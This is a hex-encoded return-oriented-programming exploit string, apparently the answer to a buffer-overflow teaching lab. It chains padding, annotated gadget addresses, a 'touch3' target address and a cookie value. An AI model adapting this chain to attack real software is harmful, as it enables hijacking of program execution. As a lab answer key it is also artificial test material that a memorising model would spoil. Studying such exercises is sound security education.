00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
95 23 40 00 00 00 00 00 /* mov rsp rax */
a1 22 40 00 00 00 00 00 /* move rax rdi */
ad 22 40 00 00 00 00 00 /* pop rax */
48 00 00 00 00 00 00 00 /* bias */
40 23 40 00 00 00 00 00 /* mov eax edx */
75 23 40 00 00 00 00 00 /* mov edx ecx */
15 24 40 00 00 00 00 00 /* mov ecx esi */                        
f4 22 40 00 00 00 00 00 /* lea    (%rdi,%rsi,1),%rax */
a1 22 40 00 00 00 00 00 /* move rax rdi */
c9 20 40 00 00 00 00 00 /* touch3 */
32 38 34 36 31 34 30 35 /* cookie */
00 00 00 00 00 00 00 00